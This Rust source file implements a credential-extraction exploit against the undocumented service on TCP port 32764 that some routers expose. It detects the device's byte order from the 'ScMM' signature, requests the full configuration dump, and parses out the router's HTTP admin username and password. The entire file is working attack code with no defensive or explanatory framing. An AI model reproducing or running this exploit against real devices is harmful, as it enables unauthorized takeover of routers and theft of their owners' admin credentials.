use std::io::{Read, Write};
use std::net::{TcpStream, Shutdown};
use std::time::Duration;
use regex::Regex;
use byteorder::{ByteOrder, LittleEndian, BigEndian};

#[derive(Debug)]
enum Endian {
    Little,
    Big,
}

pub struct Trigger {
    host: String,
    port: u16,
}

impl Trigger {
    pub fn new(host: &str) -> Self {
        Trigger {
            host: host.to_string(),
            port: 32764,
        }
    }

    fn connect(&self) -> Option<TcpStream> {
        match TcpStream::connect((self.host.as_str(), self.port)) {
            Ok(mut stream) => {
                stream.set_read_timeout(Some(Duration::from_secs(3))).ok()?;
                stream.set_write_timeout(Some(Duration::from_secs(3))).ok()?;
                Some(stream)
            }
            Err(_) => None,
        }
    }

    fn detect_endian(&self) -> Option<Endian> {
        let mut stream = self.connect()?;
        
        // Send trigger "abcd"
        if stream.write_all(b"abcd").is_err() {
            return None;
        }

        // Read exactly 12 bytes
        let mut response = [0u8; 12];
        if stream.read_exact(&mut response).is_err() {
            return None;
        }
        stream.shutdown(Shutdown::Both).ok();

        // Unpack as little-endian first
        let sig_le = LittleEndian::read_u32(&response[0..4]);
        let _ = LittleEndian::read_u32(&response[4..8]);
        let _ = LittleEndian::read_u32(&response[8..12]);

        if sig_le == 0x53634D4D {
            return Some(Endian::Little);
        }

        // Unpack as big-endian
        let sig_be = BigEndian::read_u32(&response[0..4]);
        if sig_be == 0x53634D4D {
            return Some(Endian::Big);
        }

        None
    }

    fn talk(stream: &mut TcpStream, endian: &Endian, message: u32, payload: &[u8]) -> Option<Vec<u8>> {
        let mut header = [0u8; 12];
        let len = payload.len() as u32 + 1; // +1 for null terminator

        // Pack header according to endianness
        match endian {
            Endian::Little => {
                LittleEndian::write_u32(&mut header[0..4], 0x53634D4D);
                LittleEndian::write_u32(&mut header[4..8], message);
                LittleEndian::write_u32(&mut header[8..12], len);
            }
            Endian::Big => {
                BigEndian::write_u32(&mut header[0..4], 0x53634D4D);
                BigEndian::write_u32(&mut header[4..8], message);
                BigEndian::write_u32(&mut header[8..12], len);
            }
        }

        // Send header + payload + null
        if stream.write_all(&header).is_err() || 
           stream.write_all(payload).is_err() || 
           stream.write_all(&[0]).is_err() {
            return None;
        }

        // Read response header (12 bytes)
        let mut resp_header = [0u8; 12];
        if stream.read_exact(&mut resp_header).is_err() {
            return None;
        }

        // Unpack response header
        let (sig, ret_val, ret_len) = match endian {
            Endian::Little => (
                LittleEndian::read_u32(&resp_header[0..4]),
                LittleEndian::read_u32(&resp_header[4..8]),
                LittleEndian::read_u32(&resp_header[8..12]),
            ),
            Endian::Big => (
                BigEndian::read_u32(&resp_header[0..4]),
                BigEndian::read_u32(&resp_header[4..8]),
                BigEndian::read_u32(&resp_header[8..12]),
            ),
        };

        // Validate signature
        if sig != 0x53634D4D || ret_val != 0 {
            return None;
        }

        // Read response data
        let mut data = vec![0u8; ret_len as usize];
        if stream.read_exact(&mut data).is_err() {
            return None;
        }

        Some(data)
    }

    pub fn extract_credentials(&self) -> Option<(String, String)> {
        let endian = self.detect_endian()?;
        let mut stream = self.connect()?;

        // Request configuration (message=1)
        let config = Self::talk(&mut stream, &endian, 1, &[])?;
        stream.shutdown(Shutdown::Both).ok();

        // Convert to string lossy (may contain non-UTF8)
        let config_str = String::from_utf8_lossy(&config).into_owned();
        
        // Split using null or 0x01 as separator
        let parts: Vec<&str> = config_str
            .split(|c| c == '\0' || c == '\x01')
            .collect();

        // Create regex pattern
        let pattern = Regex::new(r"user(name)?|password|login").unwrap();
        
        let mut username = String::new();
        let mut password = String::new();

        for part in parts {
            if let Some((var, value)) = part.split_once('=') {
                if pattern.is_match(var) && !value.is_empty() {
                    match var {
                        "http_username" => username = value.to_string(),
                        "http_password" => password = value.to_string(),
                        _ => {}
                    }
                }
            }
        }

        if username.is_empty() && password.is_empty() {
            None
        } else {
            Some((username, password))
        }
    }
}
